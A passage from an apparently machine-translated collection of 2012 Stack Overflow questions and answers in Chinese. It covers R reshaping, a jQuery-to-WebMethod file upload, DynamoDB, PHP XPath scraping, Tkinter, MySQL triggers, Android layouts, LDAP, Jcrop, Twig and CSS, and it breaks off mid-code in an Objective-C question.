2000-04-03    0.1810070      0.1293746      0.7411549
2000-05-01    0.2861171      0.25387063     0.29944246 
```

我得到一个`error`：

```
dfd=dcast(df,Dates~Names,value.var="Point.Forecast")

Aggregation function missing: defaulting to length 
```

有什么建议么？

此致

# c# - 将 UploadFile 内容作为 byte[] 或来自 jquery ajax 函数的对象传递并通过 webmethod 上传

> ID：13822666
> 
> 赞同：2
> 
> 时间：2012-12-11T15:11:31.217
> 
> 标签：c#, jquery, asp.net, file-upload, webmethod

我有一个 html 页面，其中包含一个带有文件上传输入的表单。

我需要将 jquery ajax 函数中的所有字段传递给包含 WebMethod 的 aspx 页面，在这种方法中，我应该将图像上传到网站文件系统，而不是作为数据库中的字节。

在 c# 中使用带有 webmethod 的 jquery ajax 是否可行

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-05-18T08:32:47.210

如果您想将文件保存到网站文件系统，那么这是可行的。我遇到了使用 webmethod 上传文件的相同场景并看到了这个问题。我解决了这个问题，所以尽管分享我的解决方案。希望它会帮助某人。

下面是我们创建一个 FormData 对象并将我们的文件附加到它，然后通过 Jquery Ajax 将此 FormData 对象传递给 WebMethod 的代码。

```
var Upload = function () {
            var fileInputCtrl = $('<input id="File_OpenInputCtrl"  type="file" style="position: fixed; top: -100em" multiple/>');
fileInputCtrl.off('change').on('change', function (evt) {
    var files = evt.target.files;
    var fd = new FormData();
    for (var f = 0; f < files.length; f++) {
        var file = files[f];

        fd.append(file.name, file);

    }

    // Upload the formdata
    $.ajax({
        url: "Webservice.asmx/UploadFiles",
        type: "POST",
        data: fd,
        contentType: false,
        processData: false,
        success: function (result) {
            alert(result);
            $('#File_OpenInputCtrl').remove();
        },
        error: function (err) {
            alert(err.statusText);
            $('#File_OpenInputCtrl').remove();
        }
    });
});
    fileInputCtrl.click();          
  } 
```

网络方法

```
public string UploadFiles()
{
    //this function handles the upload of gallery images and magazine file 
    var Request = HttpContext.Current.Request;
    System.Web.HttpFileCollection Files = Request.Files;
    try
    {
        for (int i = 0; i < Files.Count; i++)
        {
            System.Web.HttpPostedFile File = Files[i];
            File.SaveAs(HttpContext.Current.Server.MapPath("~/Uploads/" + File.FileName));
        }
        return "Files Saved Successfully!";
    }
    catch (Exception ex)
    {
        return ex.Message;
    }

} 
```

希望能帮助到你。

# rounding - Dynamodb range_key 得到四舍五入

> ID：13822673
> 
> 赞同：0
> 
> 时间：2012-12-11T15:11:54.727
> 
> 标签：rounding, boto, amazon-dynamodb

我正在使用 boto（在 Windows 上）在 dynamodb 表中创建一个新项目，我将范围键设置为 129271300103.3986 但在数据库中它设置为 129271300103
这是 boto 问题还是 dynamodb 问题？

编辑：它不仅仅是浮点数，大整数也被切掉，
我提交 129271300103398600
但我得到 129271300103000000

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T21:03:37.457

我不确定 boto，但请确保您将对象编组到 DB 字符串不会将其四舍五入。

# php - 执行后如何从xpath节点中删除空间？

> ID：13822676
> 
> 赞同：1
> 
> 时间：2012-12-11T15:11:59.613
> 
> 标签：php, xml, xpath, web-scraping

抱歉，如果我发布了一个奇怪的问题。现在，我正在正确地解释它。

我正在尝试从网页中删除数据，例如：[http ://www.koolkart.com/nokia-lumia-800-p8251](http://www.koolkart.com/nokia-lumia-800-p8251)

我正在尝试获取“saholic”附近表格中列出的设备的价格，它是“Rs. 17759/-”，它的 xpath 是`"//*[@id="price-chart"]/tbody/tr[1]/td[3]"`

现在，当我在 chrome 中执行 xpath 时，它给出了带有空间的价格

```
"

                                Rs. 17759/-
                                " 
```

现在，当我在 php 中执行它时

```
<?php
$xpath = '//*[@id="price-chart"]/tbody/tr[1]/td[3]';          
$html = new DOMDocument();
@$html->loadHTMLFile('http://www.koolkart.com/nokia-lumia-800-p8251');
$xml = simplexml_import_dom($html);   
if (!$xml) {
    echo 'Error while parsing the document';
    exit;
}
echo $xml;
$source_image = $xml->xpath($xpath);
print_r($source_image);
?> 
```

它给出了错误！

那么，是否有任何解决方案如何删除那些尾随空格或任何其他方式如何获得该价格？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:09:58.153

我会假设你想要那个价格。

您不会在浏览器和脚本中得到相同的结果，因为`tbody`标签是由您的浏览器添加的，但不是源代码的一部分。

您可以使用这样的表达式：

```
'//*[@id="price-chart"]/tr[1]/td[3]' 
```

# python - 打开和更改后如何保存以前创建的文本文件？

> ID：13822677
> 
> 赞同：0
> 
> 时间：2012-12-11T15:12:02.757
> 
> 标签：python, tkinter

我正在用 python 构建一个文本编辑器，比如记事本，我正在使用 Tkinter。我已经成功实现了编辑器的新建、打开、另存为、退出、剪切、复制、粘贴、关于和帮助功能。但我正在为保存功能而苦苦挣扎。当我打开以前保存的文件并在编辑后保存它时，它的功能类似于另存为功能。我习惯于`tkFileDialog.asksavefile`保存文本文件并`tkFileDialog.asksavefilename`实现编辑器的另存为功能。

我对python很陌生。任何人都可以在这里指导我吗？

```
#! /usr/bin/python
import Tkinter

from Tkinter import *

import tkFileDialog, tkMessageBox     
import os

class OpenEdit:

    def __init__(self):

        # Root Frame widget

        self.root = Tk()

        # Menu panel in frame

        menubar = Menu(self.root)

        # File menu,for open,save,save as and quit       

        filemenu = Menu(menubar)
        editmenu = Menu(menubar)
        filemenu.add_command(label="New", command=self.new)
        filemenu.add_command(label="Open", command=self.open)
        filemenu.add_command(label="Save", command=self.save)
        filemenu.add_command(label="Save as", command=self.save_as)
        filemenu.add_separator()
        filemenu.add_command(label="Quit", command=self.root.quit)
        menubar.add_cascade(label="File", menu=filemenu)

        #Edit menu including Cut, Copy and Paste 
        editmenu = Menu(menubar)
        editmenu.add_command(label="Cut", command=self.cut)
        editmenu.add_command(label="copy", command=self.copy)
        editmenu.add_command(label="Paste", command=self.paste)
        menubar.add_cascade(label="Edit", menu=editmenu)

        # About menu for show about us and help

        aboutmenu = Menu(menubar)
        aboutmenu.add_command(label="About", command=self.about)
        aboutmenu.add_command(label="Help", command=self.help)
        menubar.add_cascade(label="About", menu=aboutmenu)

        # Returning defined setting for GUI

        self.root.config(menu=menubar)

        #Setting up the title of the widget

        self.root.title("Untitled - OpenEdit")

        # Adding Text Widget in the GUI

        self.text = Text(self.root)

        # This line allows it to be resized    

        self.text.pack(expand=YES, fill=BOTH)

        self.root.mainloop()       

        #Defining new method

    def new(self):
        self.root.title("Untitled - OpenEdit")
        self.file = None
        self.text.delete(1.0,END)

    #Defining open method

    def open(self):

        self.file = tkFileDialog.askopenfilename(defaultextension=".txt",filetypes=[("All Files","*.*"),("Text Documents","*.txt")])

        if self.file == "":

            #no file to open

            self.file = None
        else:

            #try to open the file
            #set the window title

            self.root.title(os.path.basename(self.file) + " - OpenEdit")
            self.text.delete(1.0,END)

            file = open(self.file,"r")

            self.text.insert(1.0,file.read())

            file.close()    

    #Defining save method
    def save(self):

        fileName = tkFileDialog.asksaveasfile(mode='w')
        try:
            file = open(fileName, 'w')
            textoutput = self.text.get(0.0, END)
            file.write(textoutput)
        except:
            pass
        finally:
            file.close()

    #Defining save_as method

    def save_as(self):

        fileName = tkFileDialog.asksaveasfilename(initialfile='Untitled.txt',defaultextension=".txt",filetypes=[("All Files","*.*"),("Text Documents","*.txt")])
        try:
            file = open(fileName, 'w')
            textoutput = self.text.get(0.0, END)
            file.write(textoutput)
        except:
            pass
        finally:
            file.close()     

    #Defining cut method

    def cut(self):
        self.text.event_generate("<<Cut>>")

    #Defining copy method

    def copy(self):
        self.text.event_generate("<<Copy>>")

     #Defining paste method
    def paste(self):
        self.text.event_generate("<<Paste>>")

    #Defining about method

    def about(self):
        tkMessageBox.showinfo("OpenEdit","Created by: XYZ")

    #Defining help method

    def help(self):
        tkMessageBox.showinfo("Help","This is help")

#Starting the instance of the class OpenEdit
OpenEdit() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:15:54.783

您的`save`函数*明确*提示输入文件名。如果您不想提示输入文件名，请不要这样做。

相反，使用当前文件名......我看到`open`已经保存了它：

```
def open(self):
    self.file = tkFileDialog.askopenfilename(... 
```

所以你可以在保存中重新使用它：

```
def save(self):
    # filename = tkFileDialog.asksaveasfile(...
    fileName = self.file 
```

# mysql - mysql更新触发旧，新行的列日志

> ID：13822678
> 
> 赞同：2
> 
> 时间：2012-12-11T15:12:04.113
> 
> 标签：mysql, triggers

**我的更新触发器**

```
BEGIN
DECLARE s VARCHAR(100);
IF (OLD.authUId <> NEW.authUId) THEN SET s = CONCAT(s,'&authUId=', OLD.authUId); END IF;
IF (OLD.autPId <> NEW.autPId) THEN SET s = CONCAT(s,'&autPId=', OLD.autPId); END IF;
.....

INSERT INTO l_dblog(src,newId,oldValue) VALUE('auth_up',new.authId,s);
END 
```

**插入行 oldValue 列总是空插入，我的问题是什么？**

**我有删除触发器是成功的工作**

我的删除触发器：

```
 BEGIN
      DECLARE s VARCHAR(60);
      SET s = CONCAT('&authUId=', OLD.authUId,'&autPId=', OLD.autPId,'&authTypeId=', OLD.authTypeId,'&authValue=', OLD.authValue);   
    INSERT INTO l_dblog(src,newId,oldValue) 
     VALUE('auth_del',OLD.authId,s);
    END 
```

谢谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:24:41.783

在更新查询中将变量 s 的默认值设置为空白，然后检查天气触发器是否工作。如果不是运行触发器后出现的错误。

```
BEGIN
DECLARE s VARCHAR(100) DEFAULT '';
IF (OLD.authUId <> NEW.authUId) THEN SET s = CONCAT(s,'&authUId=', OLD.authUId); END IF;
IF (OLD.autPId <> NEW.autPId) THEN SET s = CONCAT(s,'&autPId=', OLD.autPId); END IF;
.....

INSERT INTO l_dblog(src,newId,oldValue) VALUE('auth_up',new.authId,s);
END 
```

# openerp - 将PDF文件发送回客户

> ID：13822684
> 
> 赞同：0
> 
> 时间：2012-12-11T15:12:14.483
> 
> 标签：openerp

我制作了一个带有按钮的向导。在按钮操作时，该功能会在服务器上生成 PDF 文件。如何将此文件从服务器磁盘发送回客户端？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T20:39:39.077

如果不是报告，请将 PDF 文件写入二进制字段。

例如，请参阅[导出语言向导](http://bazaar.launchpad.net/~openerp/openobject-server/6.1/view/4312/openerp/addons/base/module/wizard/base_export_language.py#L44)

# android - 以编程方式添加相对于另一个的 ImageView (Android)

> ID：13822690
> 
> 赞同：1
> 
> 时间：2012-12-11T15:12:32.663
> 
> 标签：android, imageview, android-relativelayout, android-imageview

我正在尝试以编程方式添加一个 ImageView 然后添加另一个与此相关的。我的代码：

```
RelativeLayout mLayout = (RelativeLayout) findViewById(R.id.myLayout);
ImageView anchor = new ImageView(getApplicationContext());
anchor.setImageDrawable(getResources().getDrawable(R.drawable.anchor));
anchor.setVisibility(View.VISIBLE);
RelativeLayout.LayoutParams anchorParams = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
anchorParams.addRule(RelativeLayout.CENTER_HORIZONTAL);
anchorParams.addRule(RelativeLayout.CENTER_VERTICAL);   
mLayout.addView(anchor,anchorParams);
ImageView spinner = new ImageView(getApplicationContext());
spinner.setImageDrawable(getResources().getDrawable(R.drawable.image1));
spinner.setVisibility(View.VISIBLE);
RelativeLayout.LayoutParams spinnerParams = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
spinnerParams.addRule(RelativeLayout.CENTER_HORIZONTAL);
spinnerParams.addRule(RelativeLayout.BELOW,anchor.getId());
mLayout.addView(spinner,spinnerParams); 
```

第一个图像正是我想要的位置 - 集中 - 但第二个图像没有出现在锚点下方，而是出现在屏幕顶部，就在状态栏下方。

我错过了什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:17:56.057

我想，你得到 null `anchor.getId()`。在之前为您的锚视图设置一个 ID`addRule()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:18:48.570

我相信您需要以编程方式为锚定一个 id，然后才能使用 anchor.setId(int) 使用 anchor.getId()。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:19:12.813

很难说有什么问题，尝试制作xml并添加

```
LinearLayout myLayout = (LinearLayout) findViewById(R.id.LogoView);

                View hiddenInfo = getLayoutInflater().inflate(R.layout.search,
                        myLayout, false);
                myLayout.removeAllViews();
                myLayout.addView(hiddenInfo); 
```

# java - 将java android连接到openLDAP时出错

> ID：13822691
> 
> 赞同：2
> 
> 时间：2012-12-11T15:12:32.223
> 
> 标签：java, android, openldap, ldapconnection

我已经在我的系统上安装了 openLDAP，后端引擎为 LDAP。安装时提供的详细信息是：`Port-389,IPaddress-"192.168.....", password-"secret" ,username-bindDN-"cn=name,cn=users,dc=mydomain,dc=com"`

我正在尝试创建从 android 模拟器到安装的 LDAP 服务器的连接。我正在使用**unboundIdD LDAP SDK** for java。编写的代码如下：

```
public class MainActivity extends Activity implements OnClickListener {

//String address="ldap://server1.mydomain.com";
String address="192.168.....";
int port=389;
String bindDN="CN=name,CN=users,DC=mydomain,DC=com";
String password="secret";

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Button bt_login=(Button)findViewById(R.id.bt_login);
    bt_login.setOnClickListener(this);
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}

@Override
public void onClick(View arg0) {

       try {
        LDAPConnection c = new LDAPConnection(address,port,bindDN,password);

    } catch (LDAPException e) {

        e.printStackTrace();
    } 

}

} 
```

但是在模拟器上运行此代码..**按下登录**按钮后..我得到一个**异常**。我的错误日志如下：

`12-09 19:57:58.968: W/System.err(392): LDAPException(resultCode=52 (unavailable), errorMessage='Proxy operation retry failed', diagnosticMessage='Proxy operation retry failed') 12-09 19:57:58.972: W/System.err(392): at com.unboundid.ldap.sdk.LDAPConnection.bind(LDAPConnection.java:1837) 12-09 19:57:58.972: W/System.err(392): at com.unboundid.ldap.sdk.LDAPConnection.<init>(LDAPConnection.java:637) 12-09 19:57:58.972: W/System.err(392): at com.unboundid.ldap.sdk.LDAPConnection.<init>(LDAPConnection.java:534) 12-09 19:57:58.972: W/System.err(392): at gemini.ldapdemo2.MainActivity.onClick(MainActivity.java:41) 12-09 19:57:58.972: W/System.err(392): at android.view.View.performClick(View.java:2408) 12-09 19:57:58.972: W/System.err(392): at android.view.View$PerformClick.run(View.java:8816) 12-09 19:57:58.972: W/System.err(392): at android.os.Handler.handleCallback(Handler.java:587) 12-09 19:57:58.972: W/System.err(392): at android.os.Handler.dispatchMessage(Handler.java:92) 12-09 19:57:58.972: W/System.err(392): at android.os.Looper.loop(Looper.java:123) 12-09 19:57:58.972: W/System.err(392): at android.app.ActivityThread.main(ActivityThread.java:4627) 12-09 19:57:58.972: W/System.err(392): at java.lang.reflect.Method.invokeNative(Native Method) 12-09 19:57:58.972: W/System.err(392): at java.lang.reflect.Method.invoke(Method.java:521) 12-09 19:57:58.972: W/System.err(392): at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868) 12-09 19:57:58.972: W/System.err(392): at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626) 12-09 19:57:58.972: W/System.err(392): at dalvik.system.NativeStart.main(Native Method)`

为什么我得到这个例外。请帮助我。我是一个新人。谢谢

# tinymce - 如何在 iOS Safari 中的 TinyMCE 上设置固定高度？

> ID：13822696
> 
> 赞同：3
> 
> 时间：2012-12-11T15:12:45.443
> 
> 标签：tinymce, mobile-safari

我在让 TinyMCE 在 iPad 上具有固定高度时遇到了重大问题。我尝试在容器 div 上设置固定高度，我尝试通过 CSS 设置它，我尝试在 init 函数中定义它。

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T09:08:06.543

Tinymce 使用 iframe 来编辑内容。这里的问题是在 iPad/ios safari iframe 上没有滚动条。相反，safari 会在每次需要时放大 iframe，这样就不需要滚动条了。这就是为什么在 iOS-Safari 上设置固定高度不起作用的原因。

# paypal-sandbox - 使用带有社交引擎的贝宝沙箱

> ID：13822697
> 
> 赞同：1
> 
> 时间：2012-12-11T15:12:46.340
> 
> 标签：paypal-sandbox, socialengine

有没有人使用带有社交引擎的 Paypal 沙箱来测试订阅？我查看了代码，可以看到开发人员在哪里弄乱了沙箱，但我也看到了它不起作用的注释。

我真的很想在发布之前用沙箱测试我的页面，所以欢迎任何帮助或信息。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T20:17:59.030

通过与开发人员交谈找到答案原来您所要做的就是将 engine4_payment_gateways 数据库表中的 test_mode 列设置为 1，然后它默认为沙箱。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-19T14:50:56.990

`engine4_payment_gateways`您可以通过设置手动启用“测试”支付`enabled`网关`1`。然后在订阅过程中会出现默认支付网关的按钮。

# shell - 如何使用 shell 脚本来迭代我可以在像 DoublePendulum2.py 这样的 python 函数中使用的参数？

> ID：13822700
> 
> 赞同：1
> 
> 时间：2012-12-11T15:13:03.537
> 
> 标签：shell

基本上我希望shell脚本运行这样的东西：

```
time python DoublePendulum.py 1 1 1
time python DoublePendulum.py 1 2 1
time python DoublePendulum.py 1 4 1
time python DoublePendulum.py 1 8 1
time python DoublePendulum.py 1 16 1 
```

（程序产生特别命名的 png 文件作为输出）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:25:30.183

假设您要为循环设置一些终止条件：

```
increment=1
terminating=2056

while [[ "$increment" -lt "$terminating" ]]
do
    time python DoublePendulum.py 1 "$increment" 1
    increment=$((increment * 2))
done 
```

**解释：**

*   `increment`: 每次乘以 2 递增的变量
*   `terminating`：用于跟踪何时终止循环的变量。（或者，您可以通过实现一个每次递增 1 的单独计数器来执行您希望循环运行的次数。
*   `while [[ "$increment" -lt "$terminating" ]]`: 未达到终止条件时运行。
*   `time python DoublePendulum.py 1 "$increment" 1`: 代入你的增量。
*   `increment=$((increment * 2))`: 增加你的增量。

# mysql - 创建 MySQL 查询的问题

> ID：13822701
> 
> 赞同：0
> 
> 时间：2012-12-11T15:13:11.183
> 
> 标签：mysql, sql

我有以下 MySQL 表：

![在此处输入图像描述](../Images/6c458aac40a68952017357f59dd99c39.png)

我想知道是否有机会编写一个查询，该查询可以从“名称”列中检索不同的值以及每个名称值的最新日期。

对于给定的数据，所需的输出是：

```
╔═════════╦════════════╗
║  Name   ║    Date    ║
╠═════════╬════════════╣
║ Foo     ║ 2012-12-11 ║
║ Bar     ║ 2012-12-26 ║
║ Foo Bar ║ 2012-12-18 ║
╚═════════╩════════════╝ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:14:34.157

使用`MAX`和`GROUP BY`

```
SELECT name, MAX(date) date
FROM tableName
GROUP BY name 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/31040/2)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:15:24.683

```
SELECT name, MAX(date) FROM tableName GROUP BY name; 
```

这是从列中检索所有项目`name`（不使用`distinct`），并对它们进行分组，以便我们可以获得最大数量。`group by`允许其他漂亮的技巧，如`COUNT()`,`MIN()`等。

# php - 使用 Jcrop 裁剪并使用 PHP GD 保存时如何获取可变宽度和高度

> ID：13822705
> 
> 赞同：13
> 
> 时间：2012-12-11T15:13:21.883
> 
> 标签：php, image, gd, crop, jcrop

我有一个应用程序必须裁剪宽度和高度可变的图像。但我不知道如何使用 php gd (Createimagefromjpeg) 函数执行此操作

在我的代码中，我有：

```
$targ_w = 400;
$targ_h = 400; 
```

这意味着裁剪后的图像将始终获得此宽度和高度。那不是我想要的。我想以某种方式裁剪图像并像我在裁剪区域中选择它一样裁剪它，如下图所示：

![裁剪图像](../Images/b796acdbac170f3dd1f7c39f776c464e.png)

现在，当我裁剪该图像时，就像在图片中一样，我得到了这个：

![创建的方形图像](../Images/72e9c99d318630c4d3f51de94b678233.png)

这是一个方形图像，因为我必须给出宽度和高度。但是在我裁剪的每张图像上，尺寸都是不同的。

有没有办法（变量，id等）来做到这一点？

感谢：D

**编辑：我创建裁剪图像的代码：**

```
<!DOCTYPE>
<html>
<head>
    <title>Cropped Image</title>
</head>
<body>

<?php
SESSION_start();
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
$targ_w = 400;
$targ_h = 400;
$jpeg_quality = 100;

$src = $_SESSION['target_path'];
$img_r = imagecreatefromjpeg($src);
$dst_r = ImageCreateTrueColor( $targ_w, $targ_h );

imagecopyresampled($dst_r,$img_r,0,0,$_POST['x'],$_POST['y'],
$targ_w,$targ_h,$_POST['w'],$_POST['h']);

header('Content-type: image/jpeg');
imagejpeg($dst_r, 'data/uploads/' . basename($src));
header('Location:'.$src);
exit;
}

?>

</body>
</html> 
```

我上传图片的代码：

```
<!DOCTYPE>
<html>

<head>
    <title>Het Vergeet-mij-nietje</title>
    <link href="style/default.css" REL="stylesheet" TYPE="text/css">
    <script type="text/javascript" src="js/showfunctie.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.Jcrop.min.js"></script>
    <link rel="stylesheet" href="css/jquery.Jcrop.css" type="text/css" />
</head>

<body>
<center>
    <div id="title">
    <h1><a href="index.php" id="link1">Het "Vergeet-mij-nietje"</a></h1>
    <h3>Upload Systeem</h3>
    </div>

<div id="content1">
    <p><b>Upload hier een afbeelding en druk op upload om hem vervolgens te kunnen bijsnijden.</b></p>
    <form action="uploaded.php" method="post" enctype="multipart/form-data">
        <input type="file" name="filename" />
        <input type="submit" value="Upload" />
    </form>
<br /> <br />

<p align="left"><b>Bekijk hier de gecropte en geuploadde foto's</b></p>

    <p class="album">
        <?php include 'album.php';?>
    </p>

</div>

<div id="copyright">
Copyright &copy; Kees Sonnema & Jan Beetsma
</div>

</body>
</html> 
```

我使用 JCrop 裁剪图像的代码：

```
<html>
    <head>
    <script src="js/jquery-1.7.2.min.js"></script>
    <script src="js/lightbox.js"></script>  
    <link href="style/css/lightbox.css" rel="stylesheet" />
    </head>
<body>

<?php

$page = $_SERVER['PHP_SELF'];

//settings
$column = 6;

// directories
$base = "data";
$uploads = "thumbs";

// get album
$get_album = $_GET['album'];

if (!$get_album)
{
    echo "<b>Selecteer een album:</b><p />";
    $handle = opendir($base);
    while (($file = readdir($handle))!==FALSE)
    {
        if (is_dir($base."/".$file) && $file != "." && $file !=".." && $file !="$uploads")
        {
            echo "<a href='$page?album=$file'>$file</a><br />";
        }
    }
    closedir($handle);
}

else
{
    if (!is_dir($base."/".$get_album) || strstr($get_album,".")!=NULL || strstr($get_album,"/")!=NULL || strstr($get_album,"\\")!=NULL)
    {
        echo "Dit album bestaat niet.";
    }
    else
    {
        $x = 0;
        echo "<b>$get_album</b><p />";
        $handle = opendir($base."/".$get_album);
        while (($file = readdir($handle)) !== FALSE)
        {
            if ($file != "." && $file != "..")
            {
                echo "<table style='display:inline;'><tr><td><a href='$base/$get_album/$file' rel='lightbox'><img src='$base/$get_album/$file' height='150' width='100'></a></td></tr></table>";
                $x++;
            }
                if ($x==$column)
                {
                    echo "<br />";
                    $x = 0;
                }
            }
    }
    closedir($handle);

    echo "<p /><a href='$page'>Terug Naar Albums</a>";

}

?>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-11T16:45:06.360

将线路从

```
$dst_r = ImageCreateTrueColor( $targ_w, $targ_h ); 
```

至

```
$dst_r = imagecreatetruecolor($_POST['w'], $_POST['h']); 
```

=> 这将创建一个带有选定区域的新图像，您可以删除 $targ_w 和 $targ_h 变量。

并从

```
imagecopyresampled($dst_r,$img_r,0,0,$_POST['x'],$_POST['y'],
$targ_w,$targ_h,$_POST['w'],$_POST['h']); 
```

至

```
imagecopy(
    $dst_r, $img_r,
    0, 0, $_POST['x'], $_POST['y'],
    $_POST['w'], $_POST['h']
); 
```

# twig - 表单主题：未找到函数

> ID：13822707
> 
> 赞同：1
> 
> 时间：2012-12-11T15:13:25.403
> 
> 标签：twig, symfony-2.1

我正在创建一个自定义表单主题来为自定义字段类型生成正确的 HTML。我注册了我的 twigfile，它工作正常，除了一个奇怪的函数未找到错误。

我从创建集合类型的默认主题 (form_div_layout) 中复制了部分。然后我更改了块名称以避免干扰默认样式。在更改块名称之前，它可以工作，甚至使用我的本地定义，但之后 twig 似乎无法将块用作函数（尽管它在默认主题中工作）。有人可以给我一个提示吗？

这工作，只是从默认模板复制。

```
{% block sortableCollection_widget %}
{% spaceless %}
    {% if prototype is defined %}
        {% set attr = attr|merge({'data-prototype': form_row(prototype) }) %}
    {% endif %}
    <div {{ block('widget_container_attributes') }}>
        {% if form.parent is empty %}
            {{ form_errors(form) }}
        {% endif %}
        {{ block('sortableCollection_rows') }}
        {{ form_rest(form) }}
    </div>
{% endspaceless %}
{% endblock %}

{% block sortableCollection_rows %}
{% spaceless %}
    <ol class='.collection-editor .collection-sortable'>
    {% for child in form %}
        {{ form_row(child) }}
    {% endfor %}
    </ol>
{% endspaceless %}
{% endblock sortableCollection_rows %}

{% block form_row %}
{% spaceless %}
    <li>using my template
        {{ form_label(form) }}
        {{ form_errors(form) }}
        {{ form_widget(form) }}
    </li>
{% endspaceless %}
{% endblock form_row %}

{% block form_rows %}
{% spaceless %}
    {% for child in form %}
        {{ form_row(child) }}
    {% endfor %}
{% endspaceless %}
{% endblock form_rows %} 
```

现在我将 form_row 重命名为 sortableCollection_row 并出现此错误：函数“sortableCollection_row”在第 39 行的 DTAMetadataBundle:Form:sortableCollection.html.twig 中不存在

它指向调用 sortableCollection_row(child) 的地方。

```
{% block sortableCollection_widget %}
{% spaceless %}
    {% if prototype is defined %}
        {% set attr = attr|merge({'data-prototype': form_row(prototype) }) %}
    {% endif %}
    <div {{ block('widget_container_attributes') }}>
        {% if form.parent is empty %}
            {{ form_errors(form) }}
        {% endif %}
        {{ block('sortableCollection_rows') }}
        {{ form_rest(form) }}
    </div>
{% endspaceless %}
{% endblock %}

{% block sortableCollection_rows %}
{% spaceless %}
    <ol class='.collection-editor .collection-sortable'>
    {% for child in form %}
        {{ form_row(child) }}
    {% endfor %}
    </ol>
{% endspaceless %}
{% endblock sortableCollection_rows %}

{% block sortableCollection_row %}
{% spaceless %}
    <li>using my template
        {{ form_label(form) }}
        {{ form_errors(form) }}
        {{ form_widget(form) }}
    </li>
{% endspaceless %}
{% endblock sortableCollection_row %}

{% block form_rows %}
{% spaceless %}
    {% for child in form %}
        {{ sortableCollection_row(child) }} // ERROR.
    {% endfor %}
{% endspaceless %}
{% endblock form_rows %} 
```

一个想法，有人吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T12:59:37.403

`form_row`是一个树枝函数，也是一个树枝块。因此，当您调用时，`form_row(...)`您实际上是在调用一个 twig 函数，而不是直接调用该块。该函数将包含块内容，因此我可以看到它是如何令人困惑的。

所以尝试调用`sortableCollection_row`是无效的，因为它实际上不是一个函数，它是一个块。得到它？你可以做这样的事情：

```
{% block form_rows %}
{% spaceless %}
    {% for child in form %}
        {{ block('sortableCollection_row') }} // NO ERROR
    {% endfor %}
{% endspaceless %}
{% endblock form_rows %} 
```

现在在您的`sortableCollection_row`块内而不是引用`form`您将想要引用`child`，因为您不再将子变量传递给块。

# css - 防止网络移动浏览器上的 x 滚动

> ID：13822708
> 
> 赞同：0
> 
> 时间：2012-12-11T15:13:34.967
> 
> 标签：css, mobile-safari

我在移动设备上运行我的浏览器，我在一个页面上看到的是一个巨大的 y 滚动条。所以我用了这个：

```
 body{
    overflow-y: scroll !important;    
       overflow-x: hidden !important;
    } 
```

那没有帮助，当我在浏览器上运行该站点时..这种效果不会发生。有什么方法可以禁用 y 滚动？也许这也适用于手机浏览器！？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:16:06.747

你想禁用`y`滚动，你在`x`这里禁用

```
html, body {  /*You probably wont need !important too */
   overflow-y: hidden !important;    
   overflow-x: auto !important; /*Or you can use scroll value as well*/
} 
```

[**例子**](http://jsfiddle.net/npn9K/)

> 注意：如果您禁用滚动，用户将根本无法垂直滚动。超出视口的内容将被隐藏

# objective-c - 使用另一个类中的数组 - Objective C

> ID：13822714
> 
> 赞同：1
> 
> 时间：2012-12-11T15:13:49.760
> 
> 标签：objective-c, ios, arrays

我是 Objective 和 iPad 应用程序的新手。我试图显示一个我已经在单独的类/视图控制器中使用的数组。我试图访问的数组在“MainMenuScreen.m”中，我想在另一个名为“ScoresScreen.m”的类中使用该数组。我在网上搜索过，它似乎回来了一个叫做 Segue 的东西？我正在浏览示例，但我不断收到错误，不知道该怎么做。当然必须有一种简单的方法来从不同的类中获取一个数组并显示它？我确实尝试在“ScoresScreen.m”开头执行此操作 - 导入“MainMenuScreen.m”，但在尝试从中调用数组时出现错误。我所有的代码都在工作，我只需要从另一个类中获取数组并插入我的代码。我不指望你为我做代码，但请告诉我如何使用不同类的数组？先感谢您

* * *

这是 ScoresScreen.h 的代码

```
#import <UIKit/UIKit.h>

@interface ScoresScreen : UIViewController<UITableViewDataSource, UITableViewDelegate>{
     NSMutableArray *scoresArray;
}
@property (weak, nonatomic) IBOutlet UITableView *tableView;

@end 
```

* * *

这是 ScoresScreen.m 代码 =

```
#import "ScoresScreen.h"
#import "MainMenuScreen.h"

@interface ScoresScreen ()

@end

@implementation ScoresScreen

NSMutableArray *TestScoresArray;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{

